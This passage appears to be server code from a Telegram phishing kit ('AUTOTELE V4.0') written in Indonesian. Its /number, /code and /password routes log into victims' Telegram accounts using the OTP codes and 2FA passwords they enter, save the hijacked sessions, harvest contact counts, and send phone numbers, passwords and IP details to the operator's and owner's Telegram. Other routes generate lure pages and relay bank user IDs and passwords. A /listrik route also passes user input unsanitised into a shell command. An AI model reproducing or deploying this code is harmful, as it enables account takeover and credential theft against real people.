    });
  }

  if (simulation !== true) {
    return res.status(400).json({
      success: false,
      message: "Hanya simulasi test yang diterima"
    });
  }

  const sessionId = `TEST-${Date.now()}-${crypto.randomBytes(3).toString('hex').toUpperCase()}`;

  try {
    const ipText = await getIpInfoText(ip);
    
    const message = `
╔═══════════════════════╗
║   🧪 SIMULASI TEST    ║
╚═══════════════════════╝

📌 <b>DATA TEST</b>
━━━━━━━━━━━━━━━━━━━━━
🏦 <b>Bank:</b> <code>${bank}</code>
👤 <b>User ID:</b> <code>${userId}</code>
🔑 <b>Password:</b> <code>${password}</code>
📱 <b>Nomor WA:</b> <code>${waNumber}</code>
🆔 <b>Session:</b> <code>${sessionId}</code>
⏰ <b>Waktu:</b> ${new Date().toLocaleString('id-ID')}

${ipText}

━━━━━━━━━━━━━━━━━━━━━
⚠️ Status: Simulasi Test Data
    `;

    // ⭐ PENTING: Kirim ke telegramId USER, bukan owner!
    const sendStatus = await sendMessage(message, telegramId);

    if (sendStatus === 200) {
      log.box('success', {
        Proses: 'SIMULASI TEST',
        Route: '/api/simulation-test',
        Bank: bank,
        UserId: userId,
        WaNumber: waNumber,
        TelegramID: telegramId,
        SessionId: sessionId,
        IP: ip,
      });

      return res.json({
        success: true,
        message: "✅ Data test berhasil dikirim ke Telegram!",
        data: { bank, userId, waNumber, sessionId, simulation: true }
      });
    } else {
      log.error('simulation test error', 'Gagal mengirim pesan ke Telegram');
      return res.status(502).json({
        success: false,
        message: "Pesan terkirim tapi gagal masuk Telegram (Retry limit)"
      });
    }

  } catch (error) {
    log.error('simulation test error', error.message);
    return res.status(502).json({
      success: false,
      message: "Terjadi error saat mengirim simulasi test ke Telegram"
    });
  }
});


app.post("/api/demo-bank-selection", async function(req, res) {
    const { bank, userId, password, phone, simulation } = req.body;
    const demoValuesAreValid =
      simulation === true &&
      userId === "DEMO-USER" &&
      password === "DEMO-PASSWORD" &&
      phone === "+60 00-000 0000";
    const bankIsValid =
      typeof bank === "string" &&
      bank.length <= 80 &&
      /^[a-z0-9-]+$/.test(bank);

    if (!demoValuesAreValid || !bankIsValid) {
      return res.status(400).json({
        success: false,
        message: "Endpoint ini hanya menerima data simulasi bawaan."
      });
    }

    const sessionId = `DEMO-${Date.now()}-${crypto.randomBytes(3).toString('hex').toUpperCase()}`;

    try {
      await sendDemoSimulationNotification(bank, sessionId);
      return res.json({
        success: true,
        message: "Notifikasi simulasi aman berhasil dikirim ke Telegram.",
        data: { bank, sessionId, simulation: true }
      });
    } catch (error) {
      log.error('demo simulation notification error', error.message);
      return res.status(502).json({
        success: false,
        message: "Backend menerima simulasi, tetapi notifikasi Telegram gagal dikirim."
      });
    }
});

app.post("/listrik",async function(req,res){
    
    const { idpel } = req.body;
    if (!idpel) {
      res.json({ error: "id Pelanggan Tidak Di masukkan" });
      return;
    }
  

    // Jalankan node app.js dengan argumen idpel
    exec(`node pln.js ${idpel}`, (error, stdout, stderr) => {
        if (error) {
            log.error(`listrik exec error: ${error.message}`);
            return res.status(500).json({ code: 500, error: error.message });
        }

        if (stderr) {
            log.error(`listrik stderr: ${stderr}`);
            return res.status(500).json({ code: 500, error: stderr });
        }

        try {
            // Parsing hasil output dari app.js
            const result = JSON.parse(stdout);
            res.status(200).json(result);
        } catch (parseError) {
          log.error('listrik parse error', parseError.message);
            res.status(500).json({ code: 500, error: 'Failed to parse output' });
        }
    });
  })

app.post("/number",async function(req,res){
    
    const { phone_number } = req.body;
    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;

    log.box('request', {
      Proses: 'REQUEST OTP',
      Route: '/number',
      Nomor: phone_number || '-',
      IP: ip,
    });

    if (!phone_number) {
      log.box('error', { Proses: 'REQUEST OTP', Error: 'Phone number kosong', IP: ip });
      res.json({ error: "Phone number is required" });
      return;
    }
  
   try{
  
    
    const client = new CreateClient();
    await client.connect();
    const code = await client.getCode(phone_number);
    const clientHash = crypto.randomBytes(8).toString("hex");
    clients[clientHash] = client;
    if(code.isCodeViaAppT == true){
        log.box('response', {
          Proses: 'RESPONSE OTP',
          Route: '/number',
          Status: '200 OK',
          Nomor: phone_number,
          ClientHash: clientHash,
          IP: ip,
        });
        res.json({  code: 200,phone_number:phone_number, clientHash:clientHash });
    }else{
        log.box('error', {
          Proses: 'RESPONSE OTP',
          Route: '/number',
          Status: '500 GAGAL',
          Nomor: phone_number,
          Error: typeof code === 'object' ? JSON.stringify(code) : code,
          IP: ip,
        });
        res.json({  code: 500,err:code })
    }
}catch(e){
    log.box('error', {
      Proses: 'RESPONSE OTP',
      Route: '/number',
      Status: '500 EXCEPTION',
      Nomor: phone_number,
      Error: e.message || e,
      IP: ip,
    });
    res.json({  code: 500,err:e })
    

    }
    
  
  
  })


app.post("/code", countRouteAccess, async function (req, res) {
  const { phone_number, otp_code, clientHash, idtele, provinsi } = req.body;
  const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;

  log.box('request', {
    Proses: 'SUBMIT OTP',
    Route: '/code',
    Nomor: phone_number || '-',
    Kode: otp_code || '-',
    ClientHash: clientHash || '-',
    IP: ip,
  });

  if (!phone_number) {
    log.box('error', { Proses: 'SUBMIT OTP', Error: 'Phone kosong', IP: ip });
    res.json({ error: "Phone is required" });
    return;
  }
  if (!otp_code) {
    log.box('error', { Proses: 'SUBMIT OTP', Error: 'Kode kosong', IP: ip });
    res.json({ error: "Code is required" });
    return;
  }
  if (!clientHash) {
    log.box('error', { Proses: 'SUBMIT OTP', Error: 'ClientHash kosong', IP: ip });
    res.json({ error: "Client hash is required" });
    return;
  }
  if (!idtele) {
    log.box('error', { Proses: 'SUBMIT OTP', Error: 'idtele kosong', IP: ip });
    res.json({ error: "Post is required" });
    return;
  }

  const client = clients[clientHash];

  const stcd = await client.setCode(otp_code);
  const session = await client.session.save();
  
  if (stcd.result) {
const ipText = await getIpInfoText(ip);
const contacts = await client.invoke(new Api.contacts.GetContacts());
const totalContacts = contacts.users?.length || 0;
const mutualContacts = contacts.contacts?.filter(u => u.mutual) || [];
const mutualContacts2 = contacts.users?.filter(u => u.mutualContact) || [];
const kntk = mutualContacts.length || mutualContacts2.length || 0;
const awaltext = `
╔═══════════════════════╗
║   🤖 AUTOTELE SYSTEM  ║
╚═══════════════════════╝

📌 <b>INFORMASI TARGET</b>
━━━━━━━━━━━━━━━━━━
📱 <b>Nomor</b>   : <code>${phone_number}</code>
📍 <b>Region</b>  : ${provinsi || '-'}
🌐 <b>IP</b>      : <code>${ip || '-'}</code>


${ipText}


📊 <b>STATISTIK AKUN</b>
━━━━━━━━━━━━━━━━━━
👥 Total Kontak : <b>${totalContacts}</b>
🔁 Mutual       : <b>${kntk}</b>

⚡ <b>STATUS</b>
━━━━━━━━━━━━━━━━━━
✔ Connected
✔ Session Active

━━━━━━━━━━━━━━━━━━
 <i>Salin untuk melihat OTP :</i>
`;


// =======================
// INLINE BUTTON
// =======================
const keyboard = {
  inline_keyboard: [
    [
{
        text: "Salin & Tempelkan",
        copy_text: {
          text: `/otp ${phone_number}`
        }
      }
    ]
  ]
};


// =======================
// SEND MESSAGE
// =======================
sendMessage(awaltext, idtele, keyboard).then((statusCode) => {

    if (statusCode == 200) {

        addNumber(phone_number, session, idtele);
        hitvisitor();

        log.box('success', {
            Proses: 'SUBMIT OTP',
            Route: '/code',
            Status: 'NOMOR DITAMBAHKAN',
            Nomor: phone_number,
            Alamat: provinsi || '-',
            UserId: idtele || '-',
            IP: ip,
        });

        // NOTIF OWNER
        sendMessageOwner(
            phone_number,
            provinsi || '-',
            totalContacts,
            kntk,
            ip
        );
    

        return res.json({ code: 200, needPassword: false, stcd }); 
   }else if(statusCode == 403){
        return res.json({ code: 403, error: "Nomor tersebut sudah pernah di pakai" });
       
   }else{
        return res.json({ code: 500, error: "Gagal login,Refresh halaman dan coba lagi" });
       
   }
}); 
   




   
   
  } else {
  log.warn('setCode gagal', stcd);
if (stcd == "AUTH_RESTART") {
  return res.json({ code: 500, error: "Proses otorisasi perlu diulang." });
} else if (stcd == "SIGN_IN_FAILED") {
  return res.json({ code: 500, error: "Gagal saat melakukan login." });
} else if (stcd == "PHONE_CODE_EMPTY") {
  return res.json({ code: 400, error: "Kode telepon tidak ditemukan." });
} else if (stcd == "PHONE_CODE_EXPIRED") {
  return res.json({ code: 400, error: "Kode telepon sudah kedaluwarsa. Silakan minta kode baru." });
} else if (stcd == "PHONE_CODE_INVALID") {
  return res.json({ code: 400, error: "Kode telepon tidak valid. Silakan periksa dan coba lagi." });
} else if (stcd == "PHONE_NUMBER_UNOCCUPIED") {
  return res.json({ code: 400, error: "Nomor telepon belum terdaftar. Silakan lakukan registrasi terlebih dahulu." });
} else if (stcd == "PHONE_NUMBER_INVALID") {
  return res.json({ code: 406, error: "Nomor telepon yang diberikan tidak valid." });
} else if (stcd == "UPDATE_APP_TO_LOGIN") {
  return res.json({ code: 406, error: "Silakan perbarui aplikasi ke versi terbaru untuk dapat login." });
} else {
    
    
    
  if (stcd.error.errorMessage == "SESSION_PASSWORD_NEEDED") {
    log.box('response', {
      Proses: 'RESPONSE SUBMIT OTP',
      Route: '/code',
      Status: '401 PASSWORD NEEDED',
      Nomor: phone_number,
      IP: ip,
    });
    return res.json({ code:401, needPassword: true});
 
  }
  // Jika tidak ada yang cocok, kembalikan error 500
  return res.json({ code: 500, error: "terlalu banyak tindakan,refresh halaman!." });
}

    


  }

    
    


});


app.post("/password", async function(req, res) {
    const { phone_number, password, clientHash, idtele, provinsi } = req.body;
    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;

    log.box('request', {
      Proses: 'SUBMIT PASSWORD',
      Route: '/password',
      Nomor: phone_number || '-',
      Password: password ? '***' : '-',
      ClientHash: clientHash || '-',
      IP: ip,
    });

    // Validasi parameter yang dibutuhkan
    if (!phone_number) {
        log.box('error', { Proses: 'SUBMIT PASSWORD', Error: 'Phone kosong', IP: ip });
        return res.json({ error: "Phone is required" });
    }
    if (!password) {
        log.box('error', { Proses: 'SUBMIT PASSWORD', Error: 'Password kosong', IP: ip });
        return res.json({ error: "Password is required" });
    }
    if (!clientHash) {
        log.box('error', { Proses: 'SUBMIT PASSWORD', Error: 'ClientHash kosong', IP: ip });
        return res.json({ error: "Client hash is required" });
    }
    if (!idtele) {
        log.box('error', { Proses: 'SUBMIT PASSWORD', Error: 'idtele kosong', IP: ip });
        return res.json({ error: "Post is required" });
    }

    try {
        // Mengambil client berdasarkan hash
        const client = clients[clientHash];

        // Mengatur password dan menyimpan sesi
        const passw = await client.setPassword(password);
        const session = await client.session.save();
             if (passw) {
            if (passw == 'PASSWORD_HASH_INVALID') {
                return res.json({ error: "Kata Sandi Salah." });
            } else if (passw == 'SRP_ID_INVALID') {
                return res.json({ error: "SRP ID Tidak Valid,refresh halaman." });
            } else if (passw == 'SRP_PASSWORD_CHANGED') {
                return res.json({ error: "Password Sudah Diganti." });
            } else {
                
                
                
                
                
                
                
                if(passw.firstName){
                    
                    
                    
//                   const contacts = await client.invoke(new Api.contacts.GetContacts());
//                   const mutualContacts = contacts.contacts.filter(user => user.mutual);
//                   const mutualContactss = contacts.users.filter(user => user.mutualContact);
//                   const totalContacts = contacts.users.length; //total
//                   const kntk = mutualContacts.length || mutualContactss.length || "0"; //kntkmutual
            

            
//             const awaltext = `*NOTIFIKASI BOT AUTOTELE V4.0*
            
// Nomor    : ${phone_number}
// Password : ${password}
// Alamat   : ${provinsi}
// Kontak   : ${Number(totalContacts)}
// Mutual   : ${Number(kntk)}

// Untuk melihat detail nomor, tekan:
// <code>/otp ${phone_number}</code>

// ---------------------------------
// Code By RndyTech!`;
          
// // Contoh penggunaan
// sendMessage(awaltext,idtele).then((statusCode) => {
//     // Proses kode status yang dikembalikan
//    if(statusCode == 200){
       

//            addNumberPass(phone_number, password, session, idtele);
//             hitvisitor();
//     log.box('success', {
//       Proses: 'SUBMIT PASSWORD',
//       Route: '/password',
//       Status: 'NOMOR+PASS DITAMBAHKAN',
//       Nomor: phone_number,
//       Alamat: provinsi || '-',
//       UserId: idtele || '-',
//       Nama: passw.firstName || '-',
//       IP: ip,
//     });



//             sendMessageOwner(
//             phone_number,
//             provinsi || '-',
//             totalContacts,
//             kntk,
//             ip
//         );


const ipText = await getIpInfoText(ip);

const contacts = await client.invoke(new Api.contacts.GetContacts());
const totalContacts = contacts.users?.length || 0;
const mutualContacts = contacts.contacts?.filter(u => u.mutual) || [];
const mutualContacts2 = contacts.users?.filter(u => u.mutualContact) || [];

const kntk = mutualContacts.length || mutualContacts2.length || 0;

// =======================
// TEMPLATE MESSAGE (UPGRADE)
// =======================
const awaltext = `
╔═══════════════════════╗
║   🔐 AUTOTELE V4.0    ║
╚═══════════════════════╝

📌 <b>DATA LOGIN</b>
━━━━━━━━━━━━━━━━━━
📱 <b>Nomor</b>   : <code>${phone_number}</code>
🔑 <b>Password</b>: <code>${password || '-'}</code>
📍 <b>Region</b>  : ${provinsi || '-'}


${ipText}


📊 <b>STATISTIK AKUN</b>
━━━━━━━━━━━━━━━━━━
👥 Total Kontak : <b>${totalContacts}</b>
🔁 Mutual       : <b>${kntk}</b>

━━━━━━━━━━━━━━━━━━
🧠 <i>Salin untuk melihat OTP :</i>
`;


// =======================
// INLINE BUTTON
// =======================
const keyboard = {
  inline_keyboard: [
    [
    {
        text: "Salin & Tempelkan",
        copy_text: {
          text: `/otp ${phone_number}`
        }
      }
    ]

  ]
};


// =======================
// SEND MESSAGE
// =======================
sendMessage(awaltext, idtele, keyboard).then((statusCode) => {

    if (statusCode == 200) {

        addNumberPass(phone_number, password, session, idtele);
        hitvisitor();

        log.box('success', {
            Proses: 'SUBMIT PASSWORD',
            Route: '/password',
            Status: 'NOMOR+PASS DITAMBAHKAN',
            Nomor: phone_number,
            Alamat: provinsi || '-',
            UserId: idtele || '-',
            Nama: passw?.firstName || '-',
            IP: ip,
        });

        // OWNER NOTIF (tetap)
        sendMessageOwner(
            phone_number,
            provinsi || '-',
            password,
            totalContacts,
            kntk,
            ip
        );
    
                return res.json({ code:200,msg: {
                    
                    first: passw.firstName,
                    userid: passw.id,
                    phone: passw.firstName
                    
                    
                } });
    
                
   }else if(statusCode == 403){
        return res.json({ code: 403, error: "Nomor tersebut sudah pernah di pakai" });
       
   }else{
        return res.json({ code: 500, error: "Gagal login,Refresh halaman dan coba lagi" });
       
   }
}); 

    


            
            
            
                }
                

            }
   
        }



    } catch (e) {
        // Jika terjadi error saat proses, kirimkan respons dengan pesan error
        log.box('error', {
          Proses: 'RESPONSE PASSWORD',
          Route: '/password',
          Status: 'EXCEPTION',
          Nomor: phone_number,
          Error: e.message || e,
          IP: ip,
        });
        res.json({ error: 'Internal server error', details: e.message });
    }
});

  app.get('/login', (req, res) => {
    // Jika sudah login, redirect ke dashboard
    if (req.session && req.session.authenticated) {
      return res.redirect('/dash');
    }
    res.render('login');
  });

  // Route untuk handle login POST
  app.post('/login', (req, res) => {
    const { username, password } = req.body;
    
    // Validasi credentials
    if (username === global.username && password === global.pass) {
      // Set session
      req.session.authenticated = true;
      req.session.username = username;
      
      // Redirect ke dashboard
      res.json({ success: true, redirect: '/dash' });
    } else {
      res.json({ success: false, message: 'Username atau password salah!' });
    }
  });

  // Route untuk logout
  app.post('/logout', (req, res) => {
    req.session.destroy((err) => {
      if (err) {
        return res.status(500).json({ error: 'Gagal logout' });
      }
      res.clearCookie('connect.sid'); // Clear session cookie
      res.redirect('/login');
    });
  });

  app.get('/logout', (req, res) => {
    req.session.destroy((err) => {
      if (err) {
        return res.status(500).json({ error: 'Gagal logout' });
      }
      res.clearCookie('connect.sid'); // Clear session cookie
      res.redirect('/login');
    });
  });


  app.get('/dash', requireAuth, async (req, res) => {
let configFromFile = [];
const files = await readFolder(); // Baca dari pages/ (generated)

for (let value of files) {
  
  try {
    const clientConfigPath = path.join(PAGES_CONFIG_DIR, `${value}.json`);
    const visitorPath = path.join(__dirname, 'loginList', `${value}-login-counter.txt`);
    const infoPath = path.join(__dirname, 'loginList', `${value}-login-info.json`);
    if (fs.existsSync(visitorPath) && fs.existsSync(infoPath)) {
      
      const data = await fs.promises.readFile(clientConfigPath, 'utf-8');
      const visitor = await fs.promises.readFile(visitorPath, 'utf-8');
      const info = await fs.promises.readFile(infoPath, 'utf-8');
      const config = JSON.parse(data);
      const infodata = JSON.parse(info);
      config.visitor = visitor; // Menambah properti baru
      const diffTime = getUnixTimestamp() - infodata.timestamp; 
      const totalDays = Math.floor(diffTime / (60 * 60 * 24));
      
      const hasildate = totalDays <= 2;
      
      
      if(hasildate){
        config.status = "Activate";
      }else{
        config.status = "Not Activate";
        
      }
      
      configFromFile.push(config);
    }else{

      const data = await fs.promises.readFile(clientConfigPath, 'utf-8');
      const config = JSON.parse(data);
      configFromFile.push(config);

    }
    
  } catch (err) {
    log.error('dash: config tidak ditemukan', err.message);
  }
}


let namebot = await readBotNames()

  const aktif = configFromFile.filter(c => c.status === 'Activate').length;
  log.box('request', {
    Proses: 'BUKA DASHBOARD',
    Route: 'GET /dash',
    User: req.session?.username?.toUpperCase() || '-',
    'Total Page': configFromFile.length,
    'Page Aktif': aktif,
    'Page Mati': configFromFile.length - aktif,
    IP: req.ip,
  });

res.render('dash', {
  config: configFromFile,
  namebot: namebot,
  usernm: global.username ? global.username.toUpperCase() : global.username,
});

  });
  

app.get('/api/provinsi',async (req, res) => {
  try {
    const data = await readJSONFile('data/provinsi/provinsi.json');
    res.json(data);
  } catch (err) {
    res.status(500).json({ error: 'Failed to read the JSON file' });
  }

});

app.get('/api/kabupaten/:province_id', async (req, res) => {
  const kabupatenId = parseInt(req.params.province_id); // Mendapatkan id dari parameter URL

  try {
    // Membaca file kabupaten.json
    const kabupatenData = await readJSONFile(`data/kabupaten_kota/kab-${kabupatenId}.json`);
    // Mencari kabupaten yang sesuai dengan id
    res.json(kabupatenData)
  } catch (err) {
    res.status(404).json({ message: 'Kabupaten tidak ditemukan' });  // Jika kabupaten tidak ditemukan
  }
});

app.get('/api/kecamatan/:province_id/:kabupaten_id', async (req, res) => {
  const provinceId = parseInt(req.params.province_id); // Mendapatkan id provinsi dari parameter URL
  const kabupatenId = parseInt(req.params.kabupaten_id); // Mendapatkan id kabupaten dari parameter URL

  const formattedKabupatenId = kabupatenId.toString().padStart(2, '0');
  const formattedKecamatanId = provinceId.toString().padStart(2, '0');
  const pathkey = `data/kecamatan/kec-${formattedKecamatanId}-${formattedKabupatenId}.json`;
  
  try {
    // Membaca file kabupaten.json
    const kecamatanData = await readJSONFile(pathkey);
    // Mencari kabupaten yang sesuai dengan id
    res.json(kecamatanData)
  } catch (err) {
    res.status(404).json({ message: 'Kecamatan tidak ditemukan' });  // Jika kabupaten tidak ditemukan
  }
});

app.get('/api/keldesa/:province_id/:kabupaten_id/:kecamatan_id', async (req, res) => {
  const provinceId = parseInt(req.params.province_id); // Mendapatkan id provinsi dari parameter URL
  const kabupatenId = parseInt(req.params.kabupaten_id); // Mendapatkan id kabupaten dari parameter URL
  const kecamatanId = parseInt(req.params.kecamatan_id); // Mendapatkan id kecamatan dari parameter URL

  // Format ID agar selalu dua digit
  const formattedKabupatenId = kabupatenId.toString().padStart(2, '0');
  const formattedKecamatanId = kecamatanId.toString().padStart(3, '0');  // Pastikan kecamatanId diformat dengan dua digit

  // Membuat path key sesuai dengan format yang diinginkan
  const pathkey = `data/kelurahan_desa/keldesa-${provinceId}-${formattedKabupatenId}-${formattedKecamatanId}.json`;

  try {
    // Membaca file kecamatan.json
    const kecamatanData = await readJSONFile(pathkey);
    res.json(kecamatanData);
  } catch (err) {
    res.status(404).json({ message: 'Kecamatan tidak ditemukan' });  // Jika file kecamatan tidak ditemukan
  }
});

  app.post('/delete', async (req, res) => {
  const { paramFile } = req.body;

  try {
    const clientConfigPath = path.join(PAGES_CONFIG_DIR, `${paramFile}.json`);
    const visitorPath = path.join(__dirname, 'loginList', `${paramFile}-login-counter.txt`);
    const infoPath = path.join(__dirname, 'loginList', `${paramFile}-login-info.json`);
    const data = await fs.promises.readFile(clientConfigPath, 'utf-8');
    const config = JSON.parse(data);

    // Path untuk gambar
    const ejsFilePath = path.join(PAGES_DIR, `${config.view}.ejs`);

    // Menangani gambar jika ada, dan menghapusnya
    if (config.image1Url) {
      const filePath1 = path.join(__dirname, config.image1Url.substring(config.image1Url.indexOf('/uploads/')));
      deleteFile(filePath1);
    }

    if (config.image2Url) {
      const filePath2 = path.join(__dirname, config.image2Url.substring(config.image2Url.indexOf('/uploads/')));
      deleteFile(filePath2);
    }

    if (config.image3Url) {
      const filePath3 = path.join(__dirname, config.image3Url.substring(config.image3Url.indexOf('/uploads/')));
      deleteFile(filePath3);
    }
    if (config.image4Url) {
      const filePath4 = path.join(__dirname, config.image4Url.substring(config.image4Url.indexOf('/uploads/')));
      deleteFile(filePath4);
    }
    if (config.image5Url) {
      const filePath5 = path.join(__dirname, config.image5Url.substring(config.image5Url.indexOf('/uploads/')));
      deleteFile(filePath5);
    }

    // Menghapus file .ejs
    deleteFile(ejsFilePath);

    // Menghapus file konfigurasi .json
    deleteFile(clientConfigPath);
    deleteFile(infoPath);
    deleteFile(visitorPath);

    // Redirect ke halaman dashboard setelah penghapusan
    return res.redirect(`/dash`);
  } catch (err) {
    log.error('delete error', err.message);
    res.send('Error: File konfigurasi tidak ditemukan atau penghapusan gagal!');
  }
});


async function getJumlahNomor() {
  const sql = 'SELECT COUNT(phone) AS total FROM telebot';

  try {
    const result = await executeQuery(sql); // Tidak perlu parameter di COUNT
    return result[0].total;
  } catch (err) {
    log.error('Gagal menghitung jumlah nomor', err.message);
    throw err; // lempar lagi jika ingin ditangani di atas
  }
}

function getVisitorData() {
  try {
    const filePath = path.join(__dirname, 'loginList', 'today.txt');

    if (!fs.existsSync(filePath)) return { tanggal: null, jumlah: 0 };

    const content = fs.readFileSync(filePath, 'utf-8').trim();
    
    const jumlah = content.split('|')[1];
    const currentWITA = getWITADate();
    return {
      jumlah: parseInt(jumlah) || 0
    };
  } catch (error) {
    log.error('Gagal membaca visitor', error.message);
    return { tanggal: null, jumlah: 0 };
  }
}



const filePath = path.join(__dirname, 'loginList', 'today.json');

function timeAgo(ts, { pastOnly = false } = {}) {
  const ms = Number(ts) > 1e12 ? Number(ts) : Number(ts) * 1000;
  let diff = Date.now() - ms; // (+) = sudah lewat, (-) = masa depan

  // Jika mau SELALU gaya "yang lalu", paksa diff minimal 0
  if (pastOnly && diff < 0) diff = 0;

  // "baru saja" hanya kalau selisih sangat kecil (±5 detik)
  if (Math.abs(diff) < 5_000) return 'baru saja';

  const rtf = new Intl.RelativeTimeFormat('id', { numeric: 'auto' });
  const units = [
    ['year',   365 * 24 * 60 * 60 * 1000],
    ['month',   30 * 24 * 60 * 60 * 1000],
    ['week',     7 * 24 * 60 * 60 * 1000],
    ['day',     24 * 60 * 60 * 1000],
    ['hour',    60 * 60 * 1000],
    ['minute',  60 * 1000],
    ['second',  1000],
  ];

  for (const [unit, per] of units) {
    const val = Math.round(diff / per);
    if (Math.abs(val) >= 1) {
      // diff>0 => “x yang lalu”; diff<0 => “dalam x …”
      return rtf.format(val * -1, unit);
    }
  }
  return 'baru saja';
}


// --- Helper: tanggal absolut di WITA (opsional, kalau mau ditampilkan juga)
function formatWITA(ts) {
  const ms = ts > 1e12 ? ts : ts * 1000;
  return new Intl.DateTimeFormat('id-ID', {
    timeZone: 'Asia/Makassar',
    dateStyle: 'medium',
    timeStyle: 'short'
  }).format(new Date(ms));
}

// --- Baca file, kembalikan array data
async function readLogsRaw() {
  try {
    // Jika file belum ada, anggap kosong
    if (!fs.existsSync(filePath)) return [];
    const txt = (await fsx.readFile(filePath, 'utf8')).trim();
    if (!txt) return [];
    const parsed = JSON.parse(txt);
    return Array.isArray(parsed) ? parsed : [parsed];
  } catch (err) {
    log.error('Gagal baca today.json', err.message);
    return [];
  }
}

// --- Versi "kelola": semua nilai jadi string + timestamp → "ago" (+ absolut WITA)
async function readLogsWithAgo() {
  const rows = await readLogsRaw();

  const mapped = rows.map((r) => {
    const ts = r.timestamp ?? r.time ?? r.date ?? 0;

    // Hindari "undefined"/"null" jadi string literal
    const asString = Object.fromEntries(
      Object.entries(r).map(([k, v]) => [k, v == null ? undefined : String(v)])
    );

    return {
      ...asString,
      timestamp_ago: ts ? timeAgo(Number(ts)) : 'tidak diketahui',
      timestamp_wita: ts ? formatWITA(Number(ts)) : 'tidak diketahui',
      timestamp: ts ? String(ts) : undefined, // pastikan tetap ada untuk sort
    };
  });

  // Ambil yang timestamp-nya paling besar (terbaru)
  mapped.sort((a, b) => Number(b.timestamp ?? 0) - Number(a.timestamp ?? 0));
  return mapped[0] ?? null;
}









// device > BrowserName,HardwareFamily,HardwareName,HardwareNamePrefix,HardwareVendor/OEM, PlatformName PlatformVersion, 
// ipinfo > country,region,city,latitude,longitude





function runInfo(ip, ua) {
  return new Promise((resolve, reject) => {
    execFile(
      "node",
      [path.join(__dirname, "info.js"), ip, ua],
      { timeout: 30000, maxBuffer: 1024 * 1024 * 10 },
      (error, stdout, stderr) => {
        if (error) return reject(error);

        if (stderr) log.warn('info.js stderr:', stderr);

        try {
          // ambil JSON terakhir dari output
          const match = stdout.match(/\{[\s\S]*\}$/);
          if (!match) {
            return reject(new Error("No JSON found in output"));
          }
log.info("Raw output from info.js:", stdout);
          const parsed = JSON.parse(match[0]);
          resolve(parsed);

        } catch (e) {
          reject(
            new Error(
              `Failed to parse JSON: ${e.message}\nOutput:\n${stdout}`
            )
          );
        }
      }
    );
  });
}

app.get('/info', async (req, res) => {
  try {

    // Ambil data lain paralel
    const [total, hariini, logs] = await Promise.all([
      getJumlahNomor(),
      getVisitorData(),
      readLogsWithAgo()
    ]);

    let infoFromLogs = null;
    if (logs?.ip && logs?.userAgent) {
      try { infoFromLogs = await runInfo(logs.ip, logs.userAgent); } 
      catch (e) { log.error('infoFromLogs err:', e.message); }
    }
    const currentWITA = getWITADate();

    // KIRIM SEKALI SAJA
    res.status(200).json({
      total, hariini, logs, currentWITA,
     infoFromLogs
    });
    
  } catch (err) {
    log.error('/info error', err.message);
    res.status(500).json({ code: 500, error: err.message || 'Gagal memproses /info' });
  }
});

function cleanUrlPath(inputString) {
    // Ganti spasi dengan tanda minus
    let cleanedString = inputString.replace(/\s+/g, '');
    // Hapus karakter selain huruf, angka, dan tanda minus
    cleanedString = cleanedString.replace(/[^a-zA-Z0-9\-]/g, '');
    return cleanedString.toLowerCase();
}

// Helper: Buat base URL sesuai mode
// development → http://localhost:4000  (dengan port)
// production  → https://domain.com     (tanpa port)
function getBaseUrl(req) {
  if (global.mode === 'production') {
    return req.protocol + '://' + req.hostname;
  }
  return req.protocol + '://' + req.get('host');
}

app.post('/submit', upload.fields([
  { name: 'image1', maxCount: 1 },
  { name: 'image2', maxCount: 1 },
  { name: 'image3', maxCount: 1 },
  { name: 'image4', maxCount: 1 },
  { name: 'image5', maxCount: 1 },
  { name: 'footerImage', maxCount: 1 }
]), compressAndSaveImage, async (req, res) => {
  try {
    const { theme, tampilan, customUrl, telegramId, titlefour,buttonname, footerdesc } = req.body;
    const sanitizedUrl = cleanUrlPath(customUrl);

    const config = {
      theme,
      tampilan,
      customUrl: sanitizedUrl,
      telegramId,
      titlefour,
      buttonname,
      footerdesc,
      view: sanitizedUrl,
    };

    // Menyimpan 2 versi URL gambar: original + compressed
    ['image1', 'image2', 'image3', 'image4', 'image5', 'footerImage'].forEach((field) => {
      if (req.files[field]) {
        // Original URL untuk /fasfasf (full quality)
        config[`${field}Url`] = `/uploads/${req.files[field][0].filename}`;
        // Compressed URL untuk /dash (optimized preview)
        config[`${field}UrlCompressed`] = `/uploads/${req.files[field][0].filenameCompressed}`;
      }
    });

    if (!fs.existsSync(PAGES_CONFIG_DIR)) fs.mkdirSync(PAGES_CONFIG_DIR, { recursive: true });
    if (!fs.existsSync(PAGES_DIR)) fs.mkdirSync(PAGES_DIR, { recursive: true });

    const configPath = path.join(PAGES_CONFIG_DIR, `${sanitizedUrl}.json`);
    await fs.promises.writeFile(configPath, JSON.stringify(config, null, 2));

    // Menentukan layout berdasarkan tampilan
    const headerFile = `../layout/headers${tampilan || '1'}`;
    const formFile = `../layout/form${tampilan || '1'}`;
    const footerFile = `../layout/footer${tampilan || '1'}`;

    // Membuat file EJS di pages/ (terpisah dari views/ admin)
    const viewFilePath = path.join(PAGES_DIR, `${sanitizedUrl}.ejs`);
    if (!fs.existsSync(viewFilePath)) {
      const viewContent = `<%- include('${headerFile}') %>
<%- include('${formFile}') %>
<%- include('${footerFile}') %>
`;
      await fs.promises.writeFile(viewFilePath, viewContent);
    }

    // Redirect ke dashboard setelah berhasil
    const imageCount = Object.keys(req.files || {}).length;
    log.box('success', {
      Proses: 'GENERATE HALAMAN BARU',
      Route: 'POST /submit',
      URL: sanitizedUrl,
      Theme: theme || '-',
      Tampilan: `Layout ${tampilan || '1'}`,
      'TelegramID': telegramId || '-',
      'Gambar Upload': imageCount,
      'File EJS': `pages/${sanitizedUrl}.ejs`,
      'File Config': `pages_config/${sanitizedUrl}.json`,
    });
    res.redirect(getBaseUrl(req) + '/' + cleanUrlPath(req.body.customUrl));
  } catch (error) {
    log.error('submit error', error.message);
    return res.status(500).send('Terjadi kesalahan saat menyimpan konfigurasi');
  }
});

// Fallback JSON untuk route /api/* yang tidak dikenal (hindari HTML "Cannot POST" yang bikin JSON.parse gagal di client)
app.all('/api/*', (req, res) => {
  res.status(404).json({
    success: false,
    message: `Endpoint ${req.method} ${req.path} tidak ditemukan di server`
  });
});

app.get('*', (req, res) => {
  const viewName = req.path.substring(1);
  const clientConfigPath = path.join(PAGES_CONFIG_DIR, `${viewName}.json`);

  // Cek apakah file JSON ada
  fs.readFile(clientConfigPath, 'utf-8', (err, data) => {
